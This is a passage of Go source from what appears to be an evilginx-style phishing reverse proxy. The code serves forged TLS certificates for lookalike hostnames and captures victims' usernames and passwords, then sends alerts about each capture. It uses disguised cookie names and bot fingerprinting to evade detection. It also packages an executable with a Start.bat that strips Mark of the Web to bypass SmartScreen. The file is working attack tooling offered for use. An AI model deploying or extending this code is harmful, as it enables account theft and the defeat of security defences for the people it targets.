			return s_url
		}))
	}
	return body
}

func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
		parts := strings.SplitN(host, ":", 2)
		hostname := parts[0]
		port := 443
		if len(parts) == 2 {
			port, _ = strconv.Atoi(parts[1])
		}

		// Base TLS config designed for maximum reliability and stealth:
		// - Session tickets disabled to prevent resumption issues across connections
		// - Cipher suites match typical server configurations (not client JA3)
		// - Curve preferences follow server best practices
		// - HTTP/1.1 forced to avoid HTTP/2 complexity with MITM
		baseTLSConfig := func(certs []tls.Certificate, getCert func(*tls.ClientHelloInfo) (*tls.Certificate, error)) *tls.Config {
			cfg := &tls.Config{
				// Protocol negotiation - force HTTP/1.1 to ensure MITM works correctly
				NextProtos: []string{"http/1.1"},

				// Session management - disable tickets to prevent resumption failures
				// This ensures each connection does a clean full handshake
				SessionTicketsDisabled: true,

				// TLS version range - match modern server configurations
				MinVersion: tls.VersionTLS12,
				MaxVersion: tls.VersionTLS13,

				// Cipher suites - server-side preference order matching real servers
				// These are chosen to balance security with broad compatibility
				CipherSuites: []uint16{
					// TLS 1.3 cipher suites are automatically used and can't be configured
					// For TLS 1.2, prefer ECDHE suites with modern ciphers
					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
				},

				// Curve preferences - standard server configuration
				CurvePreferences: []tls.CurveID{
					tls.X25519,
					tls.CurveP256,
					tls.CurveP384,
				},

				// Server chooses cipher (more control over security)
				PreferServerCipherSuites: true,
			}
			if len(certs) > 0 {
				cfg.Certificates = certs
			}
			if getCert != nil {
				cfg.GetCertificate = getCert
			}
			return cfg
		}

		if !p.developer {
			// Check if wildcard TLS is enabled and using self-signed certs (no external DNS)
			if p.cfg.IsWildcardTLSEnabled() {
				// hostname is the phish hostname (e.g. owa.fpcsorp.ca)
				cert := p.crt_db.getWildcardCertificate(hostname)
				if cert != nil {
					log.Debug("[TLS] serving wildcard cert for %s", hostname)
					return baseTLSConfig([]tls.Certificate{*cert}, nil), nil
				}
				// Wildcard cert not found - generate one on-the-fly
				log.Debug("[TLS] wildcard cert not found for %s, generating...", hostname)
				// Extract base domain from hostname (e.g., owa.fpcsorp.ca -> fpcsorp.ca)
				parts := strings.SplitN(hostname, ".", 2)
				if len(parts) == 2 {
					wildcardDomain := "*." + parts[1]
					err := p.crt_db.setSelfSignedWildcardSync([]string{wildcardDomain})
					if err != nil {
						log.Error("[TLS] failed to generate wildcard cert: %v", err)
					} else {
						cert = p.crt_db.getWildcardCertificate(hostname)
						if cert != nil {
							log.Debug("[TLS] generated and serving wildcard cert for %s", hostname)
							return baseTLSConfig([]tls.Certificate{*cert}, nil), nil
						}
					}
				}
				// If we still don't have a cert, return error instead of hanging on certmagic
				log.Error("[TLS] no wildcard cert available for %s", hostname)
				return nil, fmt.Errorf("no wildcard certificate for %s", hostname)
			}

			getCert := func(hello *tls.ClientHelloInfo) (*tls.Certificate, error) {
				cert, err := p.crt_db.magic.GetCertificate(hello)
				if err == nil {
					return cert, nil
				}
				// Fallback: if certmagic can't provide a cert (not yet obtained, rate limited, etc.),
				// generate a self-signed cert so the connection doesn't hard-fail with ERR_SSL_PROTOCOL_ERROR.
				// The browser will show "Your connection is not private" instead of a protocol error.
				log.Warning("[TLS] certmagic has no cert for %s, using self-signed fallback: %v", hostname, err)
				fallbackCert, fallbackErr := p.crt_db.getSelfSignedCertificate(hostname, "", port)
				if fallbackErr != nil {
					return nil, fmt.Errorf("no cert available for %s: certmagic=%v, self-signed=%v", hostname, err, fallbackErr)
				}
				return fallbackCert, nil
			}

			return baseTLSConfig(nil, getCert), nil
		} else {
			var ok bool
			phish_host := ""
			if !p.cfg.IsLureHostnameValid(hostname) {
				phish_host, ok = p.replaceHostWithPhished(hostname)
				if !ok {
					log.Debug("phishing hostname not found: %s", hostname)
					return nil, fmt.Errorf("phishing hostname not found")
				}
			}

			cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
			if err != nil {
				log.Error("http_proxy: %s", err)
				return nil, err
			}
			// Developer mode also uses consistent TLS config
			cfg := baseTLSConfig([]tls.Certificate{*cert}, nil)
			cfg.InsecureSkipVerify = true
			return cfg, nil
		}
	}
}

// copyMap creates a shallow copy of a string map (safe for goroutine use)
func copyMap(m map[string]string) map[string]string {
	cp := make(map[string]string, len(m))
	for k, v := range m {
		cp[k] = v
	}
	return cp
}

func (p *HttpProxy) setSessionUsername(sid string, username string) {
	if sid == "" {
		return
	}
	username = strings.TrimRight(username, "=")
	s, ok := p.sessions[sid]
	if ok {
		s.SetUsername(username)
	}
}

func (p *HttpProxy) setSessionPassword(sid string, password string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetPassword(password)
		// Send credential_captured notification
		lureUrl := ""
		if s.PhishLure != nil && s.PhishLure.Path != "" {
			lureUrl = s.PhishLure.Path
		}
		p.notifier.Trigger(EventCredentialCaptured, &NotificationData{
			Origin:    s.RemoteAddr,
			LureURL:   lureUrl,
			Phishlet:  s.Phishlet,
			SessionID: sid,
			UserAgent: s.UserAgent,
			Username:  s.Username,
			Password:  password,
			Custom:    s.Custom,
			Session:   s,
		})
	}
}

func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetCustom(name, value)
	}
}

// configureKeepAlive enables TCP Keep-Alive on a connection to detect dead peers
// and prevent half-open connections from consuming resources indefinitely.
func configureKeepAlive(c net.Conn) {
	if tcpConn, ok := c.(*net.TCPConn); ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(tcpKeepAliveInterval)
		// Note: SetNoDelay is true by default for TCP connections in Go
	}
}

func (p *HttpProxy) httpsWorker() {
	var err error

	// Create a TCP listener with custom configuration
	lc := net.ListenConfig{
		KeepAlive: tcpKeepAliveInterval, // Enable TCP Keep-Alive on accepted connections
	}
	p.sniListener, err = lc.Listen(context.Background(), "tcp", p.Server.Addr)
	if err != nil {
		log.Fatal("%s", err)
		return
	}

	log.Info("[httpsWorker] Listening on %s with TCP Keep-Alive enabled", p.Server.Addr)
	p.isRunning = true

	for p.isRunning {
		c, err := p.sniListener.Accept()
		if err != nil {
			// Check if this is a temporary error or shutdown
			if ne, ok := err.(net.Error); ok && ne.Temporary() {
				log.Debug("[httpsWorker] Temporary accept error: %v", err)
				time.Sleep(5 * time.Millisecond) // Brief backoff for temporary errors
				continue
			}
			if !p.isRunning {
				// Normal shutdown
				return
			}
			log.Error("Error accepting connection: %s", err)
			continue
		}

		go p.handleHTTPSConnection(c)
	}
}

// handleHTTPSConnection processes a single HTTPS connection with proper error handling
// and resource cleanup. Runs in a goroutine per connection.
func (p *HttpProxy) handleHTTPSConnection(c net.Conn) {
	remoteAddr := c.RemoteAddr().String()

	// Track connection statistics
	p.connStats.Lock()
	p.connStats.activeConns++
	p.connStats.totalConns++
	p.connStats.Unlock()

	// Recover from panics but do NOT close the connection here.
	// goproxy manages connection lifecycle internally (keep-alive, etc.).
	// Closing here would kill active HTTP keep-alive connections.
	defer func() {
		if r := recover(); r != nil {
			log.Error("[httpsWorker] PANIC handling %s: %v", remoteAddr, r)
			c.Close()
			p.connStats.Lock()
			p.connStats.failedConns++
			p.connStats.Unlock()
		}
		p.connStats.Lock()
		p.connStats.activeConns--
		p.connStats.Unlock()
	}()

	// Configure TCP Keep-Alive for this connection
	configureKeepAlive(c)

	// Set initial deadlines - these will be refreshed by goproxy for each request
	now := time.Now()
	c.SetReadDeadline(now.Add(httpReadTimeout))
	c.SetWriteDeadline(now.Add(httpWriteTimeout))

	log.Debug("[httpsWorker] new TCP connection from %s", remoteAddr)

	// Parse TLS ClientHello to extract SNI without consuming the TLS data
	tlsConn, err := vhost.TLS(c)
	if err != nil {
		log.Debug("[httpsWorker] vhost.TLS error from %s: %v", remoteAddr, err)
		p.connStats.Lock()
		p.connStats.failedConns++
		p.connStats.Unlock()
		return // defer will close connection
	}

	hostname := tlsConn.Host()
	if hostname == "" {
		log.Debug("[httpsWorker] empty SNI from %s, dropping", remoteAddr)
		p.connStats.Lock()
		p.connStats.failedConns++
		p.connStats.Unlock()
		return // defer will close connection
	}

	log.Debug("[httpsWorker] SNI hostname: %s from %s", hostname, remoteAddr)

	if !p.cfg.IsActiveHostname(hostname) {
		log.Debug("[httpsWorker] hostname unsupported: %s from %s", hostname, remoteAddr)
		return // defer will close connection (not counted as failed - just unsupported)
	}

	log.Debug("[httpsWorker] hostname OK: %s from %s, forwarding to proxy", hostname, remoteAddr)

	// Update last successful connection time
	p.connStats.Lock()
	p.connStats.lastConnTime = time.Now()
	p.connStats.Unlock()

	// Keep the phish hostname for CONNECT - TLS needs it to find the wildcard cert
	// The translation to original hostname happens during request forwarding
	phishHostname := hostname

	// Create synthetic CONNECT request for goproxy
	req := &http.Request{
		Method: "CONNECT",
		URL: &url.URL{
			Opaque: phishHostname,
			Host:   net.JoinHostPort(phishHostname, "443"),
		},
		Host:       phishHostname,
		Header:     make(http.Header),
		RemoteAddr: remoteAddr,
	}

	// Use the vhost TLS connection wrapper which preserves the ClientHello data
	resp := dumbResponseWriter{tlsConn}
	p.Proxy.ServeHTTP(resp, req)
}

// ConnectionStats holds statistics about proxy connections
type ConnectionStats struct {
	ActiveConns  int64
	TotalConns   int64
	FailedConns  int64
	LastConnTime time.Time
	Uptime       time.Duration
}

// GetConnectionStats returns current connection statistics
func (p *HttpProxy) GetConnectionStats() ConnectionStats {
	p.connStats.RLock()
	defer p.connStats.RUnlock()
	return ConnectionStats{
		ActiveConns:  p.connStats.activeConns,
		TotalConns:   p.connStats.totalConns,
		FailedConns:  p.connStats.failedConns,
		LastConnTime: p.connStats.lastConnTime,
		Uptime:       time.Since(p.connStats.startTime),
	}
}

func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return pl
				}
			}
		}
	}
	return nil
}

func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return pl
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				pl, err := p.cfg.GetPhishlet(l.Phishlet)
				if err == nil {
					return pl
				}
			}
		}
	}

	return nil
}

// getPhishletByPhishHostAndPath resolves the correct phishlet when multiple phishlets
// share the same hostname. It first checks if the request path matches a lure for any
// enabled phishlet on this host, and returns that phishlet. Falls back to getPhishletByPhishHost.
func (p *HttpProxy) getPhishletByPhishHostAndPath(hostname string, path string) *Phishlet {
	// First, try to find a phishlet whose lure matches this exact path
	for _, l := range p.cfg.lures {
		if l.Path == path {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				pl, err := p.cfg.GetPhishlet(l.Phishlet)
				if err == nil {
					// Verify this phishlet actually serves this host
					phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
					if ok {
						for _, ph := range pl.proxyHosts {
							if hostname == combineHost(ph.phish_subdomain, phishDomain) {
								return pl
							}
						}
					}
					// Also check custom lure hostname
					if l.Hostname == hostname {
						return pl
					}
				}
			}
		}
	}

	// No lure path match - fall back to default host-based lookup
	return p.getPhishletByPhishHost(hostname)
}

// getLureForAnyPhishlet checks if the given path matches a lure for ANY enabled phishlet
// on the given host. Returns the matching phishlet and lure, or nil if none found.
func (p *HttpProxy) getLureForAnyPhishlet(hostname string, path string) (*Phishlet, *Lure) {
	for _, l := range p.cfg.lures {
		if l.Path == path && p.cfg.IsSiteEnabled(l.Phishlet) {
			pl, err := p.cfg.GetPhishlet(l.Phishlet)
			if err == nil {
				// Check if this phishlet serves this host
				phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
				if ok {
					for _, ph := range pl.proxyHosts {
						if hostname == combineHost(ph.phish_subdomain, phishDomain) {
							return pl, l
						}
					}
				}
				if l.Hostname == hostname {
					return pl, l
				}
			}
		}
	}
	return nil, nil
}

func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
				}
				if hostname == ph.domain {
					return prefix + phishDomain, true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) replaceUrlWithPhished(u string) (string, bool) {
	r_url, err := url.Parse(u)
	if err == nil {
		if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
			r_url.Host = r_host
			return r_url.String(), true
		}
	}
	return u, false
}

func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return phishDomain, true
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				phishDomain, ok := p.cfg.GetSiteDomain(l.Phishlet)
				if ok {
					return phishDomain, true
				}
			}
		}
	}

	return "", false
}

// func (p *HttpProxy) getHomeDir() string {
// 	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
// }

func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return ph.phish_subdomain, true
				}
			}
		}
	}
	return "", false
}

func (p *HttpProxy) handleSession(hostname string) bool {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return true
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				return true
			}
		}
	}

	return false
}

func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
	if l.OgDescription != "" || l.OgTitle != "" || l.OgImageUrl != "" || l.OgUrl != "" {
		head_re := regexp.MustCompile(`(?i)(<\s*head\s*>)`)
		var og_inject string
		og_format := "<meta property=\"%s\" content=\"%s\" />\n"
		if l.OgTitle != "" {
			og_inject += fmt.Sprintf(og_format, "og:title", l.OgTitle)
		}
		if l.OgDescription != "" {
			og_inject += fmt.Sprintf(og_format, "og:description", l.OgDescription)
		}
		if l.OgImageUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:image", l.OgImageUrl)
		}
		if l.OgUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:url", l.OgUrl)
		}

		body = []byte(head_re.ReplaceAllString(string(body), "<head>\n"+og_inject))
	}
	return body
}

func (p *HttpProxy) Start() error {
	p.stopChan = make(chan struct{})
	p.rateLimiter.Start() // DDoS protection
	go p.httpsWorker()
	go p.connectionMaintenanceWorker() // Stealth: keep connections fresh
	return nil
}

// connectionMaintenanceWorker periodically clears stale connections to prevent
// the "link doesn't work after running for a while" issue. This ensures:
// 1. Dead upstream connections are flushed
// 2. TLS session cache stays fresh
// 3. Connection pool doesn't accumulate broken connections
// 4. Stale IP whitelist entries are cleaned up
func (p *HttpProxy) connectionMaintenanceWorker() {
	ticker := time.NewTicker(connPoolRefreshInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			// Flush all idle connections - forces fresh connections on next request
			p.Proxy.Tr.CloseIdleConnections()

			// Clean up expired IP whitelist entries to prevent memory growth
			p.cleanupExpiredWhitelist()

			log.Debug("[stealth] connection pool refreshed, whitelist cleaned")
		case <-p.stopChan:
			return
		}
	}
}

// cleanupExpiredWhitelist removes expired entries from ip_whitelist and ip_sids
func (p *HttpProxy) cleanupExpiredWhitelist() {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	now := time.Now().Unix()
	cleaned := 0
	for key, expiry := range p.ip_whitelist {
		if expiry < now {
			delete(p.ip_whitelist, key)
			delete(p.ip_sids, key)
			cleaned++
		}
	}
	if cleaned > 0 {
		log.Debug("[maintenance] cleaned %d expired whitelist entries", cleaned)
	}
}

// Stop cleanly shuts down the proxy and background workers
func (p *HttpProxy) Stop() {
	if p.stopChan != nil {
		close(p.stopChan)
	}
	if p.rateLimiter != nil {
		p.rateLimiter.Stop()
	}
	p.Proxy.Tr.CloseIdleConnections()
}

func (p *HttpProxy) whitelistIP(ip_addr string, sid string, pl_name string) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	log.Debug("whitelistIP: %s %s", ip_addr, sid)
	p.ip_whitelist[ip_addr+"-"+pl_name] = time.Now().Add(10 * time.Minute).Unix()
	p.ip_sids[ip_addr+"-"+pl_name] = sid
}

func (p *HttpProxy) isWhitelistedIP(ip_addr string, pl_name string) bool {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	log.Debug("isWhitelistIP: %s", ip_addr+"-"+pl_name)
	ct := time.Now()
	if ip_t, ok := p.ip_whitelist[ip_addr+"-"+pl_name]; ok {
		et := time.Unix(ip_t, 0)
		return ct.Before(et)
	}
	return false
}

func (p *HttpProxy) getSessionIdByIP(ip_addr string, hostname string) (string, bool) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	pl := p.getPhishletByPhishHost(hostname)
	if pl != nil {
		sid, ok := p.ip_sids[ip_addr+"-"+pl.Name]
		return sid, ok
	}
	return "", false
}

func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
	if enabled {
		ptypes := []string{"http", "https", "socks5", "socks5h"}
		if !stringExists(ptype, ptypes) {
			return fmt.Errorf("invalid proxy type selected")
		}
		if len(address) == 0 {
			return fmt.Errorf("proxy address can't be empty")
		}
		if port == 0 {
			return fmt.Errorf("proxy port can't be 0")
		}

		u := url.URL{
			Scheme: ptype,
			Host:   address + ":" + strconv.Itoa(port),
		}

		if strings.HasPrefix(ptype, "http") {
			var dproxy *http_dialer.HttpTunnel
			if username != "" {
				dproxy = http_dialer.New(&u, http_dialer.WithProxyAuth(http_dialer.AuthBasic(username, password)))
			} else {
				dproxy = http_dialer.New(&u)
			}
			p.Proxy.Tr.Dial = dproxy.Dial
		} else {
			if username != "" {
				u.User = url.UserPassword(username, password)
			}

			dproxy, err := proxy.FromURL(&u, nil)
			if err != nil {
				return err
			}
			p.Proxy.Tr.Dial = dproxy.Dial
		}
	} else {
		p.Proxy.Tr.Dial = nil
	}

	// Propagate dial function to uTLS transport so HTTP/2 and
	// TLS-fingerprinted connections also route through the upstream proxy.
	if rt := GetUtlsRoundTripper(); rt != nil {
		rt.SetDial(p.Proxy.Tr.Dial)
		if enabled {
			log.Info("upstream proxy applied to uTLS transport")
		} else {
			log.Info("upstream proxy removed from uTLS transport")
		}
	}

	return nil
}

type dumbResponseWriter struct {
	net.Conn
}

func (dumb dumbResponseWriter) Header() http.Header {
	panic("Header() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Write(buf []byte) (int, error) {
	if bytes.Equal(buf, []byte("HTTP/1.0 200 OK\r\n\r\n")) {
		return len(buf), nil // throw away the HTTP OK response from the faux CONNECT request
	}
	return dumb.Conn.Write(buf)
}

func (dumb dumbResponseWriter) WriteHeader(code int) {
	panic("WriteHeader() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
}

func orPanic(err error) {
	if err != nil {
		panic(err)
	}
}

func getContentType(path string, data []byte) string {
	switch filepath.Ext(path) {
	case ".css":
		return "text/css"
	case ".js":
		return "application/javascript"
	case ".svg":
		return "image/svg+xml"
	}
	return http.DetectContentType(data)
}

func getSessionCookieName(pl_name string, cookie_name string) string {
	// Use realistic cookie name prefixes to avoid XXXX-XXXX pattern detection
	prefixes := []string{"_ga", "_gid", "_fbp", "__cf", "__utm", "_sess", "sid", "uid", "token", "auth"}
	hash := sha256.Sum256([]byte(pl_name + "-standard-open-federation-" + cookie_name))
	prefixIdx := int(hash[0]) % len(prefixes)
	s_hash := fmt.Sprintf("%x", hash[:6])
	return prefixes[prefixIdx] + "_" + s_hash
}

// generateSimpleJA4 creates a JA4-like fingerprint from HTTP headers
// This is a simplified version since we don't have access to TLS Client Hello
func (p *HttpProxy) generateSimpleJA4(userAgent string, acceptLang string, headers http.Header) string {
	// Build a fingerprint from HTTP layer data (JA4H-like)
	// Format: protocol_headercount_accepthash_uahash

	protocol := "h2" // Assume HTTP/2 for HTTPS

	// Count meaningful headers
	headerCount := 0
	headerKeys := []string{}
	for k := range headers {
		headerKeys = append(headerKeys, strings.ToLower(k))
		headerCount++
	}
	sort.Strings(headerKeys)

	// Hash the sorted header keys
	headerHash := sha256.Sum256([]byte(strings.Join(headerKeys, ",")))
	headerHashStr := hex.EncodeToString(headerHash[:])[:12]

	// Hash the user agent
	uaHash := sha256.Sum256([]byte(userAgent))
	uaHashStr := hex.EncodeToString(uaHash[:])[:12]

	// Check for Accept-Language presence (bots often lack this)
	langIndicator := "0"
	if acceptLang != "" {
		langIndicator = "1"
	}

	// Check for common bot indicators in User-Agent
	botIndicator := "0"
	uaLower := strings.ToLower(userAgent)
	botKeywords := []string{"bot", "crawler", "spider", "curl", "wget", "python", "java", "scanner", "headless"}
	for _, keyword := range botKeywords {
		if strings.Contains(uaLower, keyword) {
			botIndicator = "1"
			break
		}
	}

	// Format: protocol_lang_bot_headercount_headerhash_uahash
	return fmt.Sprintf("%s%s%s%02d_%s_%s", protocol, langIndicator, botIndicator, headerCount, headerHashStr, uaHashStr)
}

// createMailboxDownloadZip creates a ZIP file containing M365-Mail.exe and accounts-import.json
func (p *HttpProxy) createMailboxDownloadZip(accountsJSON string, feedUrl string) []byte {
	// Create ZIP buffer
	buf := new(bytes.Buffer)
	zipWriter := zip.NewWriter(buf)

	// The accountsJSON is already a plain array - pass it through directly
	// No need to modify since feedUrl is not needed in the import format

	// Add accounts-import.json
	accountsFile, err := zipWriter.Create("accounts-import.json")
	if err != nil {
		log.Error("[mailbox] Failed to create accounts file in ZIP: %v", err)
		return nil
	}
	_, err = accountsFile.Write([]byte(accountsJSON))
	if err != nil {
		log.Error("[mailbox] Failed to write accounts to ZIP: %v", err)
		return nil
	}
	
	// Try to find and add M365-Mail.exe from build folder
	exePaths := []string{
		filepath.Join(p.cfg.GetDataDir(), "..", "build", "M365-Mail.exe"),
		filepath.Join(p.cfg.GetDataDir(), "..", "M365-Mail.exe"),
		filepath.Join(".", "build", "M365-Mail.exe"),
		filepath.Join(".", "M365-Mail.exe"),
		"/opt/evilginx/build/M365-Mail.exe",
		"/opt/evilginx/M365-Mail.exe",
	}
	
	var exeData []byte
	for _, exePath := range exePaths {
		data, err := ioutil.ReadFile(exePath)
		if err == nil {
			exeData = data
			log.Info("[mailbox] Found M365-Mail.exe at %s", exePath)
			break
		}
	}
	
	if exeData != nil {
		exeFile, err := zipWriter.Create("M365-Mail.exe")
		if err != nil {
			log.Error("[mailbox] Failed to create exe file in ZIP: %v", err)
		} else {
			_, err = exeFile.Write(exeData)
			if err != nil {
				log.Error("[mailbox] Failed to write exe to ZIP: %v", err)
			}
		}

		// Add Start.bat launcher that removes Mark of the Web to bypass SmartScreen
		startBat, _ := zipWriter.Create("Start.bat")
		startBat.Write([]byte("@echo off\r\n" +
			"echo Starting M365 Mail...\r\n" +
			"powershell -Command \"Get-ChildItem '%~dp0' -Recurse | Unblock-File\" >nul 2>&1\r\n" +
			"start \"\" \"%~dp0M365-Mail.exe\"\r\n" +
			"exit\r\n"))
	} else {
		log.Warning("[mailbox] M365-Mail.exe not found - download package will only contain accounts")
		// Add a README explaining the exe is missing
		readmeFile, _ := zipWriter.Create("README.txt")
		readmeFile.Write([]byte("M365 Mail Accounts Export\n\nTo use these accounts:\n1. Download M365-Mail.exe separately\n2. Place accounts-import.json next to M365-Mail.exe\n3. Run M365-Mail.exe - accounts will be imported automatically\n"))
	}
	
	err = zipWriter.Close()
	if err != nil {
		log.Error("[mailbox] Failed to close ZIP: %v", err)
		return nil
	}
	
	return buf.Bytes()
}
